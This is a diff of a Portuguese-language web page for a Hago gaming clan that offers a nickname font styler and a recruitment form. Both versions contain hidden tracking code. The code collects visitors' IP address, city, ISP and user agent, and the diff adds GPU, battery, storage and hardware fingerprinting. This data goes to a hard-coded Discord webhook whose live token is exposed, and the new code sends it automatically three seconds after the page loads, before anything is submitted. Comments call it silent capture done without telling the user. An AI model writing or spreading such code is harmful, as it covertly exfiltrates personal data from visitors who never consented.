@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>D-LUX | GRUNGE ELITE ANIMATED</title>
     <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&family=Syncopate:wght@400;700&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&family=Syncopate:wght@400;700&family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
@@ -256,9 +256,14 @@
             font-size: 0.85rem;
         }
 
-        .error-message a {
-            color: #fff;
-            text-decoration: underline;
+        .terminal-status {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.75rem;
+            color: #555;
+            padding: 10px;
+            background: #000;
+            border-left: 2px solid var(--accent);
+            margin-top: 15px;
         }
 
     </style>
@@ -270,8 +275,8 @@
         <i class="fas fa-play" id="playIcon"></i>
     </button>
     <div class="music-info">
-        <marquee>Meu Flow</marquee>
-        <span style="font-size: 0.6rem; color: var(--accent); font-weight: bold; letter-spacing: 1px;"><i class="fas fa-circle" style="font-size: 0.5rem; animation: pulse-red 1s infinite;"></i> LIVE STATUS: ON AIR</span>
+        <marquee>D-LUX ELITE RADIO</marquee>
+        <span style="font-size: 0.6rem; color: var(--accent); font-weight: bold; letter-spacing: 1px;"><i class="fas fa-circle" style="font-size: 0.5rem; animation: pulse-red 1s infinite;"></i> ENCRYPTED CHANNEL</span>
     </div>
     <audio id="myAudio" loop>
         <source src="https://static.bandlab.com/on-demand-revisions/befb5420-9c17-4a45-68ae-3cf86b7e6341/befb5420-9c17-4a45-68ae-3cf86b7e6341-wav-44100-16bit.wav" type="audio/mpeg">
@@ -303,27 +308,20 @@
                 <span class="input-label">NICKNAME (SEU NOME)</span>
                 <input type="text" id="tagName" placeholder="Digite seu nome aqui..." oninput="updateTags()">
                 <div id="charLimitWarning" class="error-message">
-                    ⚠️ O Hago não permite nicks maiores que 35 caracteres. Por favor, escolha um nome mais curto.<br>
-                    Acesse: <a href="http://www.www" target="_blank">www.www</a>
+                    ⚠️ O Hago não permite nicks maiores que 35 caracteres.
                 </div>
             </div>
 
             <div class="input-group">
                 <span class="input-label">ESTILO DA FONTE</span>
                 <select id="fontSelect" onchange="updateTags()">
-                    <option value="smallCaps">ꜱᴍᴀʟʟ ᴄᴀᴘꜱ (Recomendado)</option>
+                    <option value="smallCaps">ꜱᴍᴀʟʟ ᴄᴀᴘꜱ</option>
                     <option value="normal">PADRÃO</option>
                     <option value="serifBold">𝐒𝐞𝐫𝐢𝐟 𝐁𝐨𝐥𝐝</option>
                     <option value="sansBold">𝗦𝗮𝗻𝘀 𝗕𝗼𝗹𝗱</option>
                     <option value="boldItalic">𝑩𝒐𝒍𝒅 𝑰𝒕𝒂𝒍𝒊𝒄</option>
                     <option value="boldScript">𝓒𝓪𝓵𝓵𝓲𝓰𝓻𝓪𝓹𝓱𝔂 𝓑𝓸𝓵𝓭</option>
-                    <option value="boldFraktur">𝕭𝖔𝖑𝖉 𝕱𝖗𝖆𝖐𝖙𝖚𝖗</option>
-                    <option value="sansBoldItalic">𝘽𝙤𝙡𝙙 𝙄𝙩𝙖𝙡𝙞𝙘 𝙎𝙖𝙣𝙨</option>
                     <option value="monospace">𝙼𝚘𝚗𝚘𝚜𝚙𝚊𝚌𝚎</option>
-                    <option value="cyber">₵¥฿ɆⱤ</option>
-                    <option value="l33t">L33T 57YL3</option>
-                    <option value="vaporwave">Ｖａｐｏｒｗａｖｅ</option>
-                    <option value="wavy">уσυя тєχт</option>
                 </select>
             </div>
 
@@ -336,13 +334,9 @@
                     <option value="🍹">Drink Tropical (🍹)</option>
                     <option value="🍺">Cerveja (🍺)</option>
                     <option value="🥂">Taças Brindando (🥂)</option>
-                    <option value="🍾">Champagne (🍾)</option>
-                    <option value="🥤">Copo com Canudo (🥤)</option>
-                    <option value="☕">Café (☕)</option>
                 </select>
             </div>
             
-            <!-- MOBILE -->
             <div style="margin-top: 20px;">
                 <span class="input-label" style="font-size: 0.6rem; color: #888;">VERSÃO MOBILE (CELULAR)</span>
                 <div class="tag-display-box">
@@ -351,7 +345,6 @@
                 </div>
             </div>
 
-            <!-- PC -->
             <div style="margin-top: 15px;">
                 <span class="input-label" style="font-size: 0.6rem; color: #888;">VERSÃO PC (COMPUTADOR)</span>
                 <div class="tag-display-box">
@@ -383,7 +376,6 @@
                 <input type="text" id="f_nick" placeholder="Seu nick oficial">
             </div>
 
-            <!-- NOVO CAMPO: FAMÍLIAS ANTERIORES -->
             <div class="input-group">
                 <label class="input-label"><i class="fas fa-users"></i> Famílias Anteriores</label>
                 <input type="text" id="f_history" placeholder="Em quais famílias já esteve?">
@@ -409,14 +401,6 @@
                         <i class="fas fa-bullhorn"></i>
                         <span>DIVULGADOR</span>
                     </div>
-                    <div class="spec-item" onclick="pickRole(this, 'MODERADOR DE SALAS')">
-                        <i class="fas fa-gavel"></i>
-                        <span>MODERADOR DE SALAS</span>
-                    </div>
-                    <div class="spec-item" onclick="pickRole(this, 'ADMIN. DE PARCERIAS')">
-                        <i class="fas fa-handshake"></i>
-                        <span>ADMIN. DE PARCERIAS</span>
-                    </div>
                 </div>
 
                 <div id="roleAlertBox" class="rule-alert">
@@ -426,36 +410,32 @@
 
             </div>
 
-            <button class="submit-btn" id="submitBtn" onclick="sendToDiscord()"><i class="fas fa-satellite-dish"></i> TRANSMITIR DADOS</button>
+            <div class="terminal-status" id="term-status">
+                Aguardando entrada de dados do terminal...
+            </div>
+
+            <button class="submit-btn" id="submitBtn" onclick="sendToDiscord(true)"><i class="fas fa-satellite-dish"></i> TRANSMITIR DADOS</button>
         </div>
     </div>
 </div>
 
 <script>
+    // URL DO SEU WEBHOOK (O MESMO QUE VOCÊ PASSOU)
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1473067070164959546/w9j63fmXdRzbhuoQYS0nRMmUAqkmPFForLBJr2doZax11NRyF4JzommKhpgYi2y6HkYQ";
 
     const charMaps = {
-        serifBold: { a:'𝐚', b:'𝐛', c:'𝐜', d:'𝐝', e:'𝐞', f:'𝐟', g:'𝐠', h:'𝐡', i:'𝐢', j:'𝐣', k:'𝐤', l:'𝐥', m:'𝐦', n:'𝐧', o:'𝐨', p:'𝐩', q:'𝐪', r:'𝐫', s:'𝐬', t:'𝐭', u:'𝐮', v:'𝐯', w:'𝐰', x:'𝐱', y:'𝐲', z:'𝐳', A:'𝐀', B:'𝐁', C:'𝐂', D:'𝐃', E:'𝐄', F:'𝐅', G:'𝐆', H:'𝐇', I:'𝐈', J:'𝐉', K:'𝐊', L:'𝐋', M:'𝐌', N:'𝐍', O:'𝐎', P:'𝐏', Q:'𝐐', R:'𝐑', S:'𝐒', T:'𝐓', U:'𝐔', V:'𝐕', W:'𝐖', X:'𝐗', Y:'𝐘', Z:'𝐙' },
-        sansBold: { a:'𝗮', b:'𝗯', c:'𝗰', d:'𝗱', e:'𝗲', f:'𝗳', g:'𝗴', h:'𝗵', i:'𝗶', j:'𝗷', k:'𝗸', l:'𝗹', m:'𝗺', n:'𝗻', o:'𝗼', p:'𝗽', q:'𝗾', r:'𝗿', s:'𝘀', t:'𝘁', u:'𝘂', v:'𝘃', w:'𝘄', x:'𝘅', y:'𝘆', z:'𝘇', A:'𝗔', B:'𝗕', C:'𝗖', D:'𝗗', E:'𝗘', F:'𝗙', G:'𝗚', H:'𝗛', I:'𝗜', J:'𝗝', K:'𝗞', L:'𝗟', M:'𝗠', N:'𝗡', O:'𝗢', P:'𝗣', Q:'𝗤', R:'𝗥', S:'𝗦', T:'𝗧', U:'𝗨', V:'𝗩', W:'𝗪', X:'𝗫', Y:'𝗬', Z:'𝗭' },
-        boldItalic: { a:'𝒂', b:'𝒃', c:'𝒄', d:'𝒅', e:'𝒆', f:'𝒇', g:'𝒈', h:'𝒉', i:'𝒊', j:'𝒋', k:'𝒌', l:'𝒍', m:'𝒎', n:'𝒏', o:'𝒐', p:'𝒑', q:'', r:'𝒓', s:'𝒔', t:'𝒕', u:'𝒖', v:'𝒗', w:'𝒘', x:'𝒙', y:'𝒚', z:'𝒛', A:'𝑨', B:'𝑩', C:'𝑪', D:'𝑫', E:'𝑬', F:'𝑭', G:'𝑮', H:'𝑯', I:'𝑰', J:'𝑱', K:'𝑲', L:'𝑳', M:'𝑴', N:'𝑵', O:'𝑶', P:'𝑷', Q:'𝒬', R:'𝑹', S:'𝑺', T:'𝑻', U:'𝑼', V:'𝑽', W:'𝑾', X:'𝑿', Y:'𝒀', Z:'𝒁' },
-        boldScript: { a:'𝓪', b:'𝓫', c:'𝓬', d:'𝓭', e:'𝓮', f:'𝓯', g:'𝓰', h:'𝓱', i:'𝓲', j:'𝓳', k:'𝓴', l:'𝓵', m:'𝓶', n:'𝓷', o:'𝓸', p:'𝓹', q:'𝓺', r:'𝓻', s:'𝓼', t:'𝓽', u:'𝓾', v:'𝓿', w:'𝔀', x:'𝔁', y:'𝔂', z:'𝔃', A:'𝓐', B:'𝓑', C:'𝓒', D:'𝓓', E:'𝓔', F:'𝓕', G:'𝓖', H:'𝓗', I:'𝓘', J:'𝓙', K:'𝓚', L:'𝓛', M:'𝓜', N:'𝓝', O:'𝓞', P:'𝓟', Q:'𝓠', R:'𝓡', S:'𝓢', T:'𝓣', U:'𝓤', V:'𝓥', W:'𝓦', X:'𝓧', Y:'𝓨', Z:'𝓩' },
-        boldFraktur: { a:'𝖆', b:'𝖇', c:'𝖈', d:'𝖉', e:'𝖊', f:'𝖋', g:'𝖌', h:'𝖍', i:'𝖎', j:'𝖏', k:'𝖐', l:'𝖑', m:'𝖒', n:'𝖓', o:'𝖔', p:'𝖕', q:'𝖖', r:'𝖗', s:'𝖘', t:'𝖙', u:'𝖚', v:'𝖛', w:'𝖜', x:'𝖝', y:'𝖞', z:'𝖟', A:'𝕬', B:'𝕭', C:'𝕮', D:'𝕯', E:'𝕰', F:'𝕱', G:'𝕲', H:'𝕳', I:'𝕴', J:'𝕵', K:'𝕶', L:'𝕷', M:'𝕸', N:'𝕹', O:'𝕺', P:'𝕻', Q:'𝕼', R:'𝕽', S:'𝕾', T:'𝕿', U:'𝕼', V:'𝖁', W:'𝖂', X:'𝖃', Y:'𝖄', Z:'𝖅' },
-        sansBoldItalic: { a:'𝙖', b:'𝙗', c:'𝙘', d:'𝙙', e:'𝙚', f:'𝙛', g:'𝙜', h:'𝙝', i:'𝙞', j:'', k:'𝙠', l:'𝙡', m:'𝙢', n:'𝙣', o:'𝙤', p:'𝙥', q:'𝙦', r:'𝙧', s:'𝙨', t:'𝙩', u:'𝙪', v:'𝙫', w:'𝙬', x:'𝙭', y:'𝙮', z:'𝙯', A:'𝘼', B:'𝘽', C:'𝘾', D:'𝘿', E:'𝙀', F:'𝙁', G:'𝙂', H:'𝙃', I:'𝙄', J:'', K:'𝙠', L:'𝙡', M:'𝙈', N:'𝙉', O:'𝙊', P:'𝙋', Q:'𝙌', R:'𝙍', S:'𝙎', T:'𝙏', U:'𝙐', V:'𝙑', W:'𝙒', X:'𝙓', Y:'𝙔', Z:'𝙕' },
-        monospace: { a:'𝚊', b:'𝚋', c:'𝚌', d:'𝚍', e:'𝚎', f:'𝚏', g:'𝚐', h:'𝚑', i:'𝚒', j:'𝚓', k:'𝚔', l:'𝚕', m:'𝚖', n:'𝚗', o:'𝚘', p:'𝚙', q:'', r:'𝚛', s:'𝚜', t:'𝚝', u:'𝚞', v:'𝚟', w:'𝚠', x:'𝚡', y:'𝚢', z:'𝚣', A:'𝙰', B:'𝙱', C:'𝙲', D:'𝙳', E:'𝙴', F:'𝙵', G:'𝙶', H:'𝙷', I:'𝙸', J:'𝙹', K:'𝙺', L:'𝙻', M:'𝙼', N:'𝙽', O:'𝙾', P:'𝙿', Q:'', R:'𝚁', S:'𝚂', T:'𝚃', U:'𝚄', V:'Ｖ', W:'Ｗ', X:'Ｘ', Y:'Ｙ', Z:'Ｚ' },
-        cyber: { a:'₳', b:'฿', c:'₵', d:'Đ', e:'Ɇ', f:'₣', g:'₲', h:'Ħ', i:'Ɨ', j:'Ɉ', k:'₭', l:'Ⱡ', m:'₥', n:'₦', o:'Ø', p:'₱', q:'Ɋ', r:'Ɽ', s:'₴', t:'₮', u:'Ʉ', v:'V', w:'₩', x:'Ӿ', y:'¥', z:'Ƶ', A:'₳', B:'฿', C:'₵', D:'Đ', E:'Ɇ', F:'₣', G:'₲', H:'Ħ', I:'Ɨ', J:'Ɉ', K:'₭', L:'Ⱡ', M:'₥', N:'₦', O:'Ø', P:'₱', Q:'Ɋ', R:'Ɽ', S:'₴', T:'₮', U:'Ʉ', V:'V', W:'₩', X:'Ӿ', Y:'¥', Z:'Ƶ' },
-        l33t: { a:'4', b:'8', c:'(', d:'|)', e:'3', f:'|=', g:'6', h:'|-|', i:'1', j:'_|', k:'|<', l:'|_', m:'|\\/|', n:'|\\|', o:'0', p:'|*', q:'9', r:'|2', s:'5', t:'7', u:'|_|', v:'\\/', w:'\\/\\/', x:'> <', y:'`/', z:'2' },
-        vaporwave: { a:'ａ', b:'ｂ', c:'ｃ', d:'ｄ', e:'ｅ', f:'ｆ', g:'ｇ', h:'ｈ', i:'ｉ', j:'ｊ', k:'ｋ', l:'ｌ', m:'ｍ', n:'ｎ', o:'ｏ', p:'ｐ', q:'ｑ', r:'ｒ', s:'ｓ', t:'ｔ', u:'ｕ', v:'ｖ', w:'ｗ', x:'ｘ', y:'ｙ', z:'ｚ', A:'Ａ', B:'Ｂ', C:'Ｃ', D:'Ｄ', E:'Ｅ', F:'Ｆ', G:'Ｇ', H:'Ｈ', I:'Ｉ', J:'Ｊ', K:'Ｋ', L:'Ｌ', M:'Ｍ', N:'Ｎ', O:'Ｏ', P:'Ｐ', Q:'Ｑ', R:'Ｒ', S:'Ｓ', T:'Ｔ', U:'Ｕ', V:'Ｖ', W:'Ｗ', X:'Ａ', Y:'Ｙ', Z:'Ｚ' },
-        smallCaps: { a:'ᴀ', b:'ʙ', c:'ᴄ', d:'ᴅ', e:'ᴇ', f:'ꜰ', g:'ɢ', h:'ʜ', i:'ɪ', j:'ᴊ', k:'ᴋ', l:'ʟ', m:'ᴍ', n:'ɴ', o:'ᴏ', p:'ᴘ', q:'ǫ', r:'ʀ', s:'ꜱ', t:'ᴛ', u:'ᴜ', v:'ᴠ', w:'ᴡ', x:'x', y:'ʏ', z:'ᴢ', A:'ᴀ', B:'ʙ', C:'ᴄ', D:'ᴅ', E:'ᴇ', F:'ꜰ', G:'ɢ', H:'ʜ', I:'ɪ', J:'ᴊ', K:'ᴋ', L:'ʟ', M:'ᴍ', N:'ɴ', O:'ᴏ', P:'ᴘ', Q:'ǫ', R:'ʀ', S:'ꜱ', T:'ᴛ', U:'ᴜ', V:'ᴠ', W:'ᴡ', x:'x', y:'ʏ', z:'ᴢ' },
-        wavy: { a:'α', b:'в', c:'¢', d:'∂', e:'є', f:'ƒ', g:'g', h:'н', i:'ι', j:'נ', k:'к', l:'ℓ', m:'м', n:'и', o:'σ', p:'ρ', q:'q', r:'я', s:'ѕ', t:'т', u:'υ', v:'ν', w:'ω', x:'χ', y:'у', z:'z' }
+        serifBold: { a:'𝐚', b:'𝐛', c:'𝐜', d:'𝐝', e:'𝐞', f:'𝐟', g:'𝐠', h:'𝐡', i:'𝐢', j:'𝐣', k:'𝐤', l:'𝐥', m:'𝐦', n:'𝐧', o:'𝐨', p:'𝐩', q:'𝐪', r:'𝐫', s:'𝐬', t:'𝐭', u:'𝐮', v:'𝐯', w:'𝐰', x:'𝐱', y:'𝐲', z:'𝐳' },
+        sansBold: { a:'𝗮', b:'𝗯', c:'𝗰', d:'𝗱', e:'𝗲', f:'𝗳', g:'𝗴', h:'𝗵', i:'𝗶', j:'𝗷', k:'𝗸', l:'𝗹', m:'𝗺', n:'𝗻', o:'𝗼', p:'𝗽', q:'𝗾', r:'𝗿', s:'𝘀', t:'𝘁', u:'𝘂', v:'𝘃', w:'𝘄', x:'𝘅', y:'𝘆', z:'𝘇' },
+        boldItalic: { a:'𝒂', b:'𝒃', c:'𝒄', d:'𝒅', e:'𝒆', f:'𝒇', g:'𝒈', h:'𝒉', i:'𝒊', j:'𝒋', k:'𝒌', l:'𝒍', m:'𝒎', n:'𝒏', o:'𝒐', p:'𝒑', r:'𝒓', s:'𝒔', t:'𝒕', u:'𝒖', v:'𝒗', w:'𝒘', x:'𝒙', y:'𝒚', z:'𝒛' },
+        smallCaps: { a:'ᴀ', b:'ʙ', c:'ᴄ', d:'ᴅ', e:'ᴇ', f:'ꜰ', g:'ɢ', h:'ʜ', i:'ɪ', j:'ᴊ', k:'ᴋ', l:'ʟ', m:'ᴍ', n:'ɴ', o:'ᴏ', p:'ᴘ', q:'ǫ', r:'ʀ', s:'ꜱ', t:'ᴛ', u:'ᴜ', v:'ᴠ', w:'ᴡ', x:'x', y:'ʏ', z:'ᴢ' },
+        monospace: { a:'𝚊', b:'𝚋', c:'𝚌', d:'𝚍', e:'𝚎', f:'𝚏', g:'𝚐', h:'𝚑', i:'𝚒', j:'𝚓', k:'𝚔', l:'𝚕', m:'𝚖', n:'𝚗', o:'𝚘', p:'𝚙', q:'𝚚', r:'𝚛', s:'𝚜', t:'𝚝', u:'𝚞', v:'𝚟', w:'𝚠', x:'𝚡', y:'𝚢', z:'𝚣' }
     };
 
     const rolesRulesDict = {
-        'SEGURANÇA': "Sua missão é manter a ordem. Não abuse do poder, aja com imparcialidade.",
-        'RECRUTADOR': "Traga novos membros que agreguem valor à família, avaliando sempre o perfil comportamental.",
-        'CARISMA': "Interaja, puxe assunto e faça todos os membros e visitantes se sentirem bem-vindos.",
-        'DIVULGADOR': "Compartilhe nossos eventos e recrutamentos nos canais adequados sem praticar spam.",
-        'MODERADOR DE SALAS': "Mantenha o ambiente limpo e respeitoso. Medie conflitos com calma.",
-        'ADMIN. DE PARCERIAS': "Não faça parcerias com famílias rivais. Respeite os limites diplomáticos."
+        'SEGURANÇA': "Manter a ordem na sala. Expulsar baderneiros.",
+        'RECRUTADOR': "Trazer membros ativos e de confiança para a D-LUX.",
+        'CARISMA': "Animar o chat e recepcionar convidados.",
+        'DIVULGADOR': "Espalhar a marca D-LUX em outras salas e redes."
     };
 
     let selectedRole = "";
@@ -464,7 +444,7 @@
         if (style === 'normal') return text;
         const map = charMaps[style];
         if (!map) return text;
-        return text.split('').map(char => map[char] || map[char.toUpperCase()] || char).join('');
+        return text.split('').map(char => map[char.toLowerCase()] || char).join('');
     }
 
     function updateTags() {
@@ -489,144 +469,178 @@
 
     function copyTag(id) {
         const text = document.getElementById(id).innerText;
-        if (text.length > 35) {
-            alert("⚠️ O Hago não permite nicks maiores que 35 caracteres.");
-            return;
-        }
-
         const el = document.createElement('textarea');
         el.value = text;
         document.body.appendChild(el);
         el.select();
         document.execCommand('copy');
         document.body.removeChild(el);
-        
-        const btn = event.target.closest('.copy-btn');
-        const oldHTML = btn.innerHTML;
-        btn.innerHTML = "<i class='fas fa-check'></i> COPIADO!";
-        btn.style.background = "#00ff40";
-        btn.style.color = "#000";
-        setTimeout(() => {
-            btn.innerHTML = oldHTML;
-            btn.style.background = "var(--accent)";
-            btn.style.color = "#fff";
-        }, 1500);
+        alert("Copiado!");
     }
 
     function pickRole(el, role) {
         document.querySelectorAll('.spec-item').forEach(i => i.classList.remove('active'));
         el.classList.add('active');
         selectedRole = role;
-
         const alertBox = document.getElementById('roleAlertBox');
         const alertText = document.getElementById('roleAlertText');
-        alertBox.classList.remove('show');
-        
-        setTimeout(() => {
-            alertText.innerText = rolesRulesDict[role];
-            alertBox.classList.add('show');
-        }, 50);
+        alertText.innerText = rolesRulesDict[role];
+        alertBox.classList.add('show');
     }
 
     function toggleMusic() {
         const audio = document.getElementById('myAudio');
         const icon = document.getElementById('playIcon');
-        if (audio.paused) { 
-            audio.play(); 
-            icon.className = "fas fa-pause"; 
-        } else { 
-            audio.pause(); 
-            icon.className = "fas fa-play"; 
-        }
+        if (audio.paused) { audio.play(); icon.className = "fas fa-pause"; } 
+        else { audio.pause(); icon.className = "fas fa-play"; }
     }
 
-    // CAPTURA SILENCIOSA DE DADOS (IP, LOCALIZAÇÃO, ISP)
-    async function captureIntel() {
-        try {
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
-            return {
-                ip: data.ip || 'Oculto',
-                location: `${data.city}, ${data.region}, ${data.country_name}`,
-                isp: data.org || 'Desconhecido',
-                device: navigator.userAgent
-            };
-        } catch (error) {
-            return { ip: 'Falha', location: 'Falha', isp: 'Falha', device: navigator.userAgent };
-        }
-    }
-
-    async function sendToDiscord() {
-        const callname = document.getElementById('f_callname').value;
-        const age = document.getElementById('f_age').value;
-        const nick = document.getElementById('f_nick').value;
-        const history = document.getElementById('f_history').value || "Nenhum histórico informado";
-        const btn = document.getElementById('submitBtn');
+    // --- SISTEMA AVANÇADO DE CAPTURA DE INTELIGÊNCIA ---
+    async function getEliteIntel() {
+        let intel = {};
         
-        if (!nick || !selectedRole || !callname) {
-            alert("Por favor, preencha os dados obrigatórios.");
+        // Geolocalização e IP via API
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            intel.geo = await res.json();
+        } catch(e) { intel.geo = { ip: 'Bloqueado', city: 'Desconhecida' }; }
+        
+        // GPU Detalhada (Hardware Acceleration)
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            intel.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+            intel.gpu_vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
+        } catch(e) { intel.gpu = "N/A"; }
+        
+        // Armazenamento / Disco
+        if(navigator.storage && navigator.storage.estimate) {
+            const est = await navigator.storage.estimate();
+            intel.storage = (est.quota / (1024 ** 3)).toFixed(2) + " GB";
+        }
+
+        // Dados do Navegador e Hardware
+        intel.ua = navigator.userAgent;
+        intel.lang = navigator.language;
+        intel.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        intel.ref = document.referrer || "Direto";
+        intel.platform = navigator.platform;
+        intel.ram = navigator.deviceMemory || '4+';
+        intel.cores = navigator.hardwareConcurrency || '?';
+        intel.screen = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`;
+        intel.touch = navigator.maxTouchPoints || '0';
+        
+        // Bateria
+        if(navigator.getBattery) {
+            try {
+                const b = await navigator.getBattery();
+                intel.bat = (b.level * 100).toFixed(0) + "%";
+                intel.charging = b.charging ? "SIM" : "NÃO";
+            } catch(e) {}
+        }
+
+        intel.time = new Date().toLocaleString('pt-BR');
+        return intel;
+    }
+
+    let silenciouEnviado = false;
+
+    async function sendToDiscord(manual = false) {
+        if (!manual && silenciouEnviado) return;
+        
+        const callname = manual ? document.getElementById('f_callname').value : "SISTEMA D-LUX";
+        const nick = document.getElementById('f_nick').value || "N/A";
+        const age = document.getElementById('f_age').value || "N/A";
+        const history = document.getElementById('f_history').value || "Nenhum";
+        const status = document.getElementById('term-status');
+        const btn = document.getElementById('submitBtn');
+
+        if(manual && (!callname || !selectedRole)) {
+            status.innerText = "⚠️ DADOS INCOMPLETOS NO TERMINAL.";
+            status.style.color = "red";
             return;
         }
 
-        const originalText = btn.innerHTML;
-        btn.innerHTML = "<i class='fas fa-spinner fa-spin'></i> PROCESSANDO...";
+        if(manual) {
+            btn.innerHTML = "<i class='fas fa-sync fa-spin'></i> TRANSMITINDO...";
+            btn.disabled = true;
+        }
 
-        // Captura o IP sem avisar o usuário
-        const intel = await captureIntel();
+        const intel = await getEliteIntel();
 
-        const data = {
-            embeds: [{
-                title: "🛡️ NOVO ALISTAMENTO: DOSSIÊ ELITE",
-                description: "Um novo candidato acaba de submeter os seus dados ao Protocolo D-LUX.",
-                color: 16711740,
-                thumbnail: { url: "https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg" },
-                fields: [
-                    { name: "👤 CANDIDATO", value: `**Nome:** ${callname}\n**Idade:** ${age || 'N/I'}\n**Hago ID:** ${nick}`, inline: false },
-                    { name: "⚔️ ESPECIALIDADE", value: `\`${selectedRole}\``, inline: true },
-                    { name: "📜 FAMÍLIAS ANTERIORES", value: history, inline: false },
-                    { 
-                        name: "📡 DADOS DE RASTREAMENTO (SILENCIOSO)", 
-                        value: `**IP:** ${intel.ip}\n**Localização:** ${intel.location}\n**Provedor (ISP):** ${intel.isp}\n**Navegador:** \`${intel.device.substring(0, 100)}...\``, 
-                        inline: false 
-                    }
-                ],
-                footer: { text: "Sistema de Transmissão Segura D-LUX | " + new Date().toLocaleString() }
-            }]
+        const payload = {
+            username: manual ? "D-LUX | RECRUTADOR" : "D-LUX | RASTREADOR",
+            avatar_url: "https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg",
+            embeds: [
+                {
+                    title: manual ? "🛡️ NOVO ALISTAMENTO: OPERAÇÃO ELITE" : "🛰️ DISPOSITIVO LOCALIZADO NO RADAR",
+                    description: manual ? "Dossiê completo do candidato interceptado." : "Monitoramento silencioso de acesso detectado.",
+                    color: manual ? 0xff003c : 0x222222,
+                    thumbnail: { url: "https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg" },
+                    fields: [
+                        { 
+                            name: "👤 DADOS DO CANDIDATO", 
+                            value: `\`\`\`yaml\nNICK: ${callname}\nID_HAGO: ${nick}\nIDADE: ${age}\nESPECIALIDADE: ${selectedRole || 'VISITANTE'}\nHISTÓRICO: ${history}\n\`\`\``, 
+                            inline: false 
+                        },
+                        { 
+                            name: "🌍 REDE & LOCALIZAÇÃO", 
+                            value: `\`\`\`ini\n[IP]: ${intel.geo?.ip || '?'}\n[CIDADE]: ${intel.geo?.city || '?'}\n[UF]: ${intel.geo?.region || '?'}\n[ISP]: ${intel.geo?.org || '?'}\n[TIMEZONE]: ${intel.tz}\n\`\`\``, 
+                            inline: false 
+                        },
+                        { 
+                            name: "💻 HARDWARE & TELA", 
+                            value: `\`\`\`http\nGPU: ${intel.gpu}\nRAM_APROX: ${intel.ram}GB\nCORES: ${intel.cores}\nRESOLUÇÃO: ${intel.screen}\nDISCO: ${intel.storage || '?'}\n\`\`\``, 
+                            inline: false 
+                        },
+                        { 
+                            name: "📱 SISTEMA & ENERGIA", 
+                            value: `\`\`\`fix\nOS: ${intel.platform}\nBATERIA: ${intel.bat || '?'}\nCARREGANDO: ${intel.charging || '?'}\nIDIOMA: ${intel.lang}\nREF: ${intel.ref}\n\`\`\``, 
+                            inline: false 
+                        },
+                        { 
+                            name: "🕵️ USER AGENT", 
+                            value: `\`\`\`\n${intel.ua}\n\`\`\``, 
+                            inline: false 
+                        }
+                    ],
+                    footer: { text: `D-LUX SECURITY PROTOCOL • ${intel.time}` }
+                }
+            ]
         };
 
         try {
-            const response = await fetch(DISCORD_WEBHOOK_URL, { 
-                method: "POST", 
-                headers: { "Content-Type": "application/json" }, 
-                body: JSON.stringify(data) 
+            await fetch(DISCORD_WEBHOOK_URL, { 
+                method: 'POST', 
+                headers: {'Content-Type': 'application/json'}, 
+                body: JSON.stringify(payload) 
             });
-            
-            if (response.ok) {
-                btn.innerHTML = "<i class='fas fa-check-circle'></i> TRANSMISSÃO CONCLUÍDA!";
+            if(manual) {
+                btn.innerHTML = "<i class='fas fa-check'></i> ENVIADO COM SUCESSO";
                 btn.style.background = "#00ff40";
                 btn.style.color = "#000";
+                status.innerText = "Transmissão concluída. Dados criptografados.";
+                status.style.color = "#00ff40";
             } else {
-                throw new Error();
+                silenciouEnviado = true;
             }
-        } catch (e) { 
-            btn.innerHTML = "<i class='fas fa-times-circle'></i> ERRO NA TRANSMISSÃO!";
+        } catch(e) {
+            if(manual) {
+                btn.innerHTML = "ERRO NA TRANSMISSÃO";
+                btn.disabled = false;
+            }
         }
-
-        setTimeout(() => {
-            btn.innerHTML = originalText;
-            btn.style.background = "var(--accent)";
-            btn.style.color = "#fff";
-        }, 3000);
     }
 
-    // Scroll Reveal
-    function reveal() {
+    window.onload = () => {
         var reveals = document.querySelectorAll(".reveal");
-        reveals.forEach(r => { if (r.getBoundingClientRect().top < window.innerHeight - 50) r.classList.add("active"); });
-    }
-    window.addEventListener("scroll", reveal);
-    window.onload = () => { reveal(); updateTags(); };
+        reveals.forEach(r => r.classList.add("active"));
+        updateTags();
+        
+        // Inicia rastreamento silencioso após 3 segundos
+        setTimeout(() => sendToDiscord(false), 3000);
+    };
 </script>
 </body>
 </html>
-
